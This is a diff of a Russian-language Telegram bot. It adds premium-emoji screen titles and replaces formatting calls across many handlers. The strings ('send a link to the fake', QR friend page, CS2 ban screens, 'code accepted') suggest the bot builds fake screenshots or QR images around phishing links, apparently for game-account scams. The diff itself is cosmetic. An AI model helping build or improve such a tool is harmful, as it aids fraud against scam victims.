@@ -534,8 +534,24 @@ function screenLabel(templateName, mode) {
   return modeLabel ? `${label} · ${modeLabel}` : label;
 }
 
+// Шапки экранов, у которых есть свой премиум-эмодзи. Пока только QR; остальные ждут ID и идут обычным
+// эмодзи из templateLabel. В тексте эмодзи — <tg-emoji>, глиф внутри тега остаётся фолбэком.
+const SCREEN_ICONS = {
+  [config.TEMPLATES.QR_FRIEND]: { id: '5422814644093868925', glyph: '📷', title: 'QR-страница' }
+};
+
+function screenTitle(templateName, mode) {
+  const custom = SCREEN_ICONS[templateName];
+
+  if (custom) {
+    return `<tg-emoji emoji-id="${custom.id}">${custom.glyph}</tg-emoji> ${custom.title}`;
+  }
+
+  return escapeHtml(screenLabel(templateName, mode));
+}
+
 function formatTemplateHint(templateName, text, mode) {
-  return formatHint(screenLabel(templateName, mode), text);
+  return formatHintRaw(screenTitle(templateName, mode), text);
 }
 
 function formatStateHint(state, text) {
@@ -2236,7 +2252,7 @@ async function sendResult(ctx, imageBuffer, { label, status = '✅ Готово'
   const message = await ctx.replyWithPhoto(
     { source: imageBuffer },
     {
-      caption: formatHint(label, line),
+      caption: formatHintRaw(label, line),
       parse_mode: 'HTML',
       reply_markup: ui.decorateInline(keyboard)
     }
@@ -2462,7 +2478,7 @@ bot.action('again', async (ctx) => {
     userState.set(ctx.from.id, state);
     await editMenu(
       ctx,
-      formatHint(templateLabel(template), 'Отправь ссылку на фейк.'),
+      formatTemplateHint(template, 'Отправь ссылку на фейк.'),
       waitingKeyboard(template)
     );
     return;
@@ -2523,7 +2539,7 @@ bot.action('qr_friend', async (ctx) => {
 
   await editMenu(
     ctx,
-    formatHint(templateLabel(config.TEMPLATES.QR_FRIEND), 'Отправь ссылку на фейк.'),
+    formatTemplateHint(config.TEMPLATES.QR_FRIEND, 'Отправь ссылку на фейк.'),
     waitingKeyboard(config.TEMPLATES.QR_FRIEND)
   );
 });
@@ -2908,7 +2924,7 @@ async function applyCs2Ban(ctx, banText) {
 
     // Время бана остаётся на кнопках: ту же ссылку можно прогнать другим сроком, не возвращаясь в меню.
     await sendResult(ctx, imageBuffer, {
-      label: screenLabel(state.template, state.addErrorMode),
+      label: screenTitle(state.template, state.addErrorMode),
       status: `⛔ ${banText}`,
       keyboard: cs2BanKeyboard()
     });
@@ -3067,7 +3083,7 @@ bot.on('text', async (ctx) => {
       userState.set(ctx.from.id, state);
 
       await sendResult(ctx, imageBuffer, {
-        label: screenLabel(state.template, state.addErrorMode),
+        label: screenTitle(state.template, state.addErrorMode),
         keyboard: resultTemplateKeyboard(state.template)
       });
     } catch (error) {
@@ -3122,7 +3138,7 @@ bot.on('text', async (ctx) => {
       userState.set(ctx.from.id, state);
 
       await sendResult(ctx, imageBuffer, {
-        label: screenLabel(state.template, state.addErrorMode),
+        label: screenTitle(state.template, state.addErrorMode),
         keyboard: resultTemplateKeyboard(state.template)
       });
     } catch (error) {
@@ -3185,7 +3201,7 @@ bot.on('text', async (ctx) => {
       userState.set(ctx.from.id, state);
 
       await sendResult(ctx, imageBuffer, {
-        label: screenLabel(state.template, state.addErrorMode),
+        label: screenTitle(state.template, state.addErrorMode),
         status: `✅ Код ${code} принят`,
         keyboard: resultTemplateKeyboard(state.template)
       });
@@ -3212,7 +3228,7 @@ bot.on('text', async (ctx) => {
     } catch {
       await editMenu(
         ctx,
-        formatHint(templateLabel(config.TEMPLATES.QR_FRIEND), 'Отправь действующий http/https адрес.'),
+        formatTemplateHint(config.TEMPLATES.QR_FRIEND, 'Отправь действующий http/https адрес.'),
         waitingKeyboard(config.TEMPLATES.QR_FRIEND)
       );
       return;
@@ -3235,7 +3251,7 @@ bot.on('text', async (ctx) => {
       userState.set(ctx.from.id, state);
 
       await sendResult(ctx, imageBuffer, {
-        label: templateLabel(config.TEMPLATES.QR_FRIEND),
+        label: screenTitle(config.TEMPLATES.QR_FRIEND),
         keyboard: resultTemplateKeyboard(config.TEMPLATES.QR_FRIEND)
       });
     } catch (error) {
@@ -3247,7 +3263,7 @@ bot.on('text', async (ctx) => {
 
       await editMenu(
         ctx,
-        formatHint(templateLabel(config.TEMPLATES.QR_FRIEND), 'Не удалось собрать изображение. Отправь ссылку ещё раз.'),
+        formatTemplateHint(config.TEMPLATES.QR_FRIEND, 'Не удалось собрать изображение. Отправь ссылку ещё раз.'),
         errorKeyboard(config.TEMPLATES.QR_FRIEND)
       );
     }
@@ -3362,7 +3378,7 @@ bot.on('text', async (ctx) => {
       userState.set(ctx.from.id, state);
 
       await sendResult(ctx, imageBuffer, {
-        label: screenLabel(state.template, state.addErrorMode),
+        label: screenTitle(state.template, state.addErrorMode),
         keyboard: resultTemplateKeyboard(state.template)
       });
     } catch (error) {
@@ -3439,7 +3455,7 @@ bot.on('text', async (ctx) => {
       userState.set(ctx.from.id, state);
 
       await sendResult(ctx, imageBuffer, {
-        label: screenLabel(state.template, state.addErrorMode),
+        label: screenTitle(state.template, state.addErrorMode),
         keyboard: resultTemplateKeyboard(state.template)
       });
     } catch (error) {
@@ -3496,7 +3512,7 @@ bot.on('text', async (ctx) => {
       userState.set(ctx.from.id, state);
 
       await sendResult(ctx, imageBuffer, {
-        label: screenLabel(state.template, state.addErrorMode),
+        label: screenTitle(state.template, state.addErrorMode),
         keyboard: resultTemplateKeyboard(state.template, true)
       });
     } catch (error) {
@@ -3647,7 +3663,7 @@ bot.on('text', async (ctx) => {
     userState.set(ctx.from.id, state);
 
     await sendResult(ctx, imageBuffer, {
-      label: screenLabel(state.template, state.addErrorMode),
+      label: screenTitle(state.template, state.addErrorMode),
       keyboard: resultTemplateKeyboard(state.template, Boolean(state.lastFriendPageData))
     });
   } catch (error) {
